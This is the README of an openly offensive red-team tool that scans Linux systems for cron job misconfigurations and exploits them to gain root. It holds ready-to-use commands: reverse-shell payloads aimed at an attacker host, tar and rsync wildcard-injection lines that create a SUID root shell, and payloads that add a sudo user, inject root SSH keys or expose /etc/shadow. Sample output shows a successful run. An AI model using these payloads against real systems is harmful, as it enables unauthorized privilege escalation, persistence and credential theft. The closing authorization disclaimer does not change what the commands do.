# RT Cron Job Exploitation Framework

> **Part of the 30 Days of Red Team Toolkit**

A modular framework for discovering and exploiting cron job misconfigurations.

```
â•”â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•—
â•‘     Cron Job Exploitation Framework                           â•‘
â•‘     "Patience is a virtue. Root is the reward."               â•‘
â•šâ•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
```

## ğŸ¯ Features

- **Comprehensive Cron Scanning**: /etc/crontab, cron.d, cron.{hourly,daily,weekly,monthly}, user crontabs, systemd timers
- **Vulnerability Detection**: Writable scripts, writable directories, missing scripts, wildcard injection, PATH hijacking
- **Multiple Payloads**: SUID bash, reverse shell, add user, SSH key injection, shadow file access
- **Execution Monitoring**: Automatically detects when payload executes
- **Smart Prioritization**: Exploits CRITICAL vulnerabilities first

## ğŸ“¦ Installation

```bash
# Clone or copy the rt_cron_exploiter directory
cd /path/to/toolkit

# Run directly
python3 -m rt_cron_exploiter

# Or import in your scripts
from rt_cron_exploiter import CronExploiter
```

## ğŸš€ Quick Start

### Command Line

```bash
# Auto-scan and exploit (uses suid_bash payload)
python3 -m rt_cron_exploiter

# Scan only - no exploitation
python3 -m rt_cron_exploiter --scan

# Use reverse shell payload
python3 -m rt_cron_exploiter --payload reverse_shell --lhost 10.10.10.10 --lport 4444

# Exploit specific writable script
python3 -m rt_cron_exploiter --exploit /opt/scripts/backup.sh

# List available payloads
python3 -m rt_cron_exploiter --payloads

# Don't monitor after exploitation
python3 -m rt_cron_exploiter --no-monitor
```

### Python API

```python
from rt_cron_exploiter import CronExploiter
from rt_cron_exploiter.payloads import PayloadType

# Initialize
exploiter = CronExploiter()

# Scan only
result = exploiter.scan()

# Scan and exploit with SUID bash
result = exploiter.scan_and_exploit()

# Scan and exploit with reverse shell
result = exploiter.scan_and_exploit(
    payload_type=PayloadType.REVERSE_SHELL,
    lhost="10.10.10.10",
    lport=4444
)

# Save reports
exploiter.save_report(result)
exploiter.generate_exploit_guide(result)

# List payloads
exploiter.list_payloads()
```

## ğŸ“Š Vulnerability Types

### 1. Writable Script (CRITICAL/HIGH)
```
Cron script is writable by current user.
Exploitation: Replace script content with payload.
```

### 2. Writable Directory (HIGH)
```
Directory containing cron script is writable.
Exploitation: Replace or create script in directory.
```

### 3. Missing Script (CRITICAL)
```
Cron references a script that doesn't exist.
Exploitation: Create the script with payload.
```

### 4. Wildcard Injection (HIGH)
```
Cron command uses wildcards with vulnerable binaries.
Exploitation: Create files that expand to malicious arguments.
```

Vulnerable binaries: `tar`, `rsync`, `chown`, `chmod`, `find`

### 5. PATH Hijacking (MEDIUM)
```
Cron uses relative paths for commands.
Exploitation: Create malicious binary in PATH.
```

## ğŸ Available Payloads

| Payload | Description | Post-Exploitation |
|---------|-------------|-------------------|
| `suid_bash` | Create SUID bash at /tmp/rootbash | `/tmp/rootbash -p` |
| `reverse_shell` | Connect back to attacker | `nc -lvnp PORT` on attacker |
| `add_user` | Create sudo user hacker:hacker123 | `su - hacker` then `sudo su -` |
| `ssh_key` | Inject SSH key into root | `ssh root@target` |
| `chmod_shadow` | Make /etc/shadow readable | `cat /etc/shadow` for hashes |

## ğŸ“ Scanned Locations

The framework scans:

- `/etc/crontab` - System crontab
- `/etc/cron.d/*` - Drop-in cron files
- `/etc/cron.hourly/*` - Hourly scripts
- `/etc/cron.daily/*` - Daily scripts
- `/etc/cron.weekly/*` - Weekly scripts
- `/etc/cron.monthly/*` - Monthly scripts
- `/var/spool/cron/crontabs/*` - User crontabs
- Systemd timers - `systemctl list-timers`

## ğŸ”¥ Wildcard Injection

### Tar Checkpoint Injection

If cron runs: `tar czf /backup/files.tar.gz *`

```bash
# In the directory where wildcard expands:
echo 'cp /bin/bash /tmp/rootbash; chmod +s /tmp/rootbash' > shell.sh
chmod +x shell.sh
echo "" > "--checkpoint=1"
echo "" > "--checkpoint-action=exec=sh shell.sh"
```

### Rsync Injection

If cron runs: `rsync -a * /backup/`

```bash
echo 'cp /bin/bash /tmp/rootbash; chmod +s /tmp/rootbash' > shell.sh
chmod +x shell.sh
echo "" > "-e sh shell.sh"
```

## ğŸ“Š Sample Output

```
â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
CRON JOB ENUMERATION
â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
[*] Scanning /etc/crontab...
[*] Scanning /etc/cron.d/...
[*] Scanning /etc/cron.daily/...

[+] Found 12 total cron jobs
[+] Found 8 jobs running as root

[+] VULNERABILITIES FOUND:
[!!!] [CRITICAL] writable_script
    Target: /opt/scripts/backup.sh
    Cron script is writable: /opt/scripts/backup.sh
    Exploit: Modify /opt/scripts/backup.sh with malicious payload

â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
EXPLOITATION PHASE
â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
[*] Exploiting writable script: /opt/scripts/backup.sh
[+] Original backed up to: /opt/scripts/backup.sh.bak.20240115120000
[+] Payload written to: /opt/scripts/backup.sh

[*] Monitoring for execution...
[+] Marker found: /tmp/rootbash
[+] SUID bash created!
[+] Run: /tmp/rootbash -p

[+] EXPLOITATION SUCCESSFUL!
```

## ğŸ—ï¸ Architecture

```
rt_cron_exploiter/
â”œâ”€â”€ __init__.py              # Package exports
â”œâ”€â”€ __main__.py              # CLI entry point
â”œâ”€â”€ README.md                # Documentation
â”œâ”€â”€ QUICKSTART.md            # Quick reference
â”‚
â”œâ”€â”€ core/
â”‚   â”œâ”€â”€ cronjob.py           # Data structures
â”‚   â””â”€â”€ exploiter.py         # Main orchestrator
â”‚
â”œâ”€â”€ scanners/
â”‚   â””â”€â”€ cron_scanner.py      # Cron discovery & analysis
â”‚
â””â”€â”€ payloads/
    â””â”€â”€ payload_generator.py # Payload generation
```

## â° Understanding Cron Schedules

```
* * * * * user command
â”‚ â”‚ â”‚ â”‚ â”‚
â”‚ â”‚ â”‚ â”‚ â””â”€ Day of week (0-7, 0 and 7 are Sunday)
â”‚ â”‚ â”‚ â””â”€â”€â”€ Month (1-12)
â”‚ â”‚ â””â”€â”€â”€â”€â”€ Day of month (1-31)
â”‚ â””â”€â”€â”€â”€â”€â”€â”€ Hour (0-23)
â””â”€â”€â”€â”€â”€â”€â”€â”€â”€ Minute (0-59)
```

Common patterns:
- `* * * * *` - Every minute (ideal for quick exploitation)
- `*/5 * * * *` - Every 5 minutes
- `0 * * * *` - Every hour
- `0 0 * * *` - Daily at midnight

## ğŸ“š Resources

- [HackTricks - Cron](https://book.hacktricks.xyz/linux-hardening/privilege-escalation#scheduled-cron-jobs)
- [GTFOBins](https://gtfobins.github.io/) - For wildcard injection techniques
- [PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Linux%20-%20Privilege%20Escalation.md#scheduled-tasks)

## âš ï¸ Legal Disclaimer

This tool is intended for **authorized security testing only**.

- Always obtain proper authorization before testing
- Use responsibly in controlled environments
- The authors are not responsible for misuse

---

**30 Days of Red Team** | *From Zero Access to Domain Admin*